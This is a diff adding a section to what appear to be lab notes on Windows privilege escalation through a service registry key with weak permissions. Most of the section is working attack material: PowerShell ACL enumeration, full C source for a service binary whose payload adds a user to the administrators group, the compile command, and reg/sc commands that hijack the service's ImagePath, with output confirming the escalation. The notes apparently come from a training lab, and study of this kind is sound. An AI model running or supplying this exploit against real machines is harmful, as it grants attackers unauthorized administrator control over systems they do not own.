@@ -205,4 +205,161 @@ Exploit target:
    0   Windows
 ```
 
-## regsvc ACL
+## Vulnerable Service ACL
+
+There might be vulnerable services located on a machine. We can check for these services by iterating through the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\` registry. `regsvc` is such a service on this machine. ^VulnService
+
+```PowerShell
+PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
+
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\regsvc
+Owner  : BUILTIN\Administrators
+Group  : NT AUTHORITY\SYSTEM
+Access : Everyone Allow  ReadKey
+         NT AUTHORITY\INTERACTIVE Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         BUILTIN\Administrators Allow  FullControl
+Audit  :
+Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
+```
+
+When we check the ACL for the service, we see that `NT AUTHORITY\INTERACTIVE Allow  FullControl` is set. Which means we have Full Control permission over the registry key. Hence, we can craft a malicious executable and change the `ImagePath` of the registry to the executable we crafted.
+
+Below is the code of the executable we will be crafting. The important section is the `system` command. Which adds a user named user (**should exist in the machine**) to the administrators group. ^Executable
+
+```C
+$ cat windows_service.c
+#include <windows.h>
+#include <stdio.h>
+
+#define SLEEP_TIME 5000
+
+SERVICE_STATUS ServiceStatus; 
+SERVICE_STATUS_HANDLE hStatus; 
+ 
+void ServiceMain(int argc, char** argv); 
+void ControlHandler(DWORD request); 
+
+//add the payload here
+int Run() 
+{ 
+    system("cmd.exe /k net localgroup administrators user /add");
+    return 0; 
+} 
+
+int main() 
+{ 
+    SERVICE_TABLE_ENTRY ServiceTable[2];
+    ServiceTable[0].lpServiceName = "MyService";
+    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+
+    ServiceTable[1].lpServiceName = NULL;
+    ServiceTable[1].lpServiceProc = NULL;
+ 
+    StartServiceCtrlDispatcher(ServiceTable);  
+    return 0;
+}
+
+void ServiceMain(int argc, char** argv) 
+{ 
+    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
+    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
+    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
+    ServiceStatus.dwWin32ExitCode      = 0; 
+    ServiceStatus.dwServiceSpecificExitCode = 0; 
+    ServiceStatus.dwCheckPoint         = 0; 
+    ServiceStatus.dwWaitHint           = 0; 
+ 
+    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
+    Run(); 
+    
+    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
+    SetServiceStatus (hStatus, &ServiceStatus);
+ 
+    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
+    {
+                Sleep(SLEEP_TIME);
+    }
+    return; 
+}
+
+void ControlHandler(DWORD request) 
+{ 
+    switch(request) 
+    { 
+        case SERVICE_CONTROL_STOP: 
+                        ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+ 
+        case SERVICE_CONTROL_SHUTDOWN: 
+            ServiceStatus.dwWin32ExitCode = 0; 
+            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
+            SetServiceStatus (hStatus, &ServiceStatus);
+            return; 
+        
+        default:
+            break;
+    } 
+    SetServiceStatus (hStatus,  &ServiceStatus);
+    return; 
+} 
+```
+
+Once the file is created, we need to compile it to match the target architecture.
+
+```bash
+x86_64-w64-mingw32-gcc windows_service.c -o x.exe
+```
+
+Now we can transfer the file to the machine over a simple HTTP server and save it in a directory we have write permission to. Once saved, we need to add the new path to the `ImagePath` value of the registry and start the service.
+
+```PowerShell
+C:\Users\user\Desktop>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\x.exe /f
+The operation completed successfully.
+
+C:\Users\user\Desktop>sc qc regsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: regsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Temp\x.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Insecure Registry Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+
+C:\Users\user\Desktop\Tools\Source>sc start regsvc
+
+SERVICE_NAME: regsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 3496
+        FLAGS              :
+
+C:\Users\user\Desktop>net localgroup administrators
+Alias name     administrators
+Comment        Administrators have complete and unrestricted access to the compu
+ter/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+TCM
+user
+The command completed successfully.
+```
+ 
+ Since the service is owned by `BUILTIN\Administrators`, it is run with the same permissions enabling us to add an user as an administrator.
+ 
+
